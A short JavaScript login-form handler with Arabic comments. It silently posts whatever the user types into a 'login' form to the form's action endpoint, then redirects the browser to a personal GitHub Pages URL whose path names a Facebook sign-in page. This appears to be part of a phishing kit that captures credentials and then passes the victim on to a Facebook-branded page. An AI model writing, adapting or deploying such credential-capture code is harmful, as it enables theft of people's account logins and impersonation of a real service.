const form = document.getElementById("login");

form.addEventListener("submit", async (event) => {
  event.preventDefault(); // منع الصفحة من إعادة التحميل

  const data = new FormData(event.target);
  
  // إرسال البيانات في الخلفية
  const response = await fetch(event.target.action, {
    method: 'POST',
    body: data,
    headers: {
        'Accept': 'application/json'
    }
  });

  if (response.ok) {
    // هنا تضع الرابط الذي تريد توجيه المستخدم إليه مجاناً
    window.location.href = "https://kurayami-kun.github.io/facebook/sign_in.html"; 
  } else {
    alert("حدث خطأ أثناء الإرسال، حاول مجدداً.");
  }
});
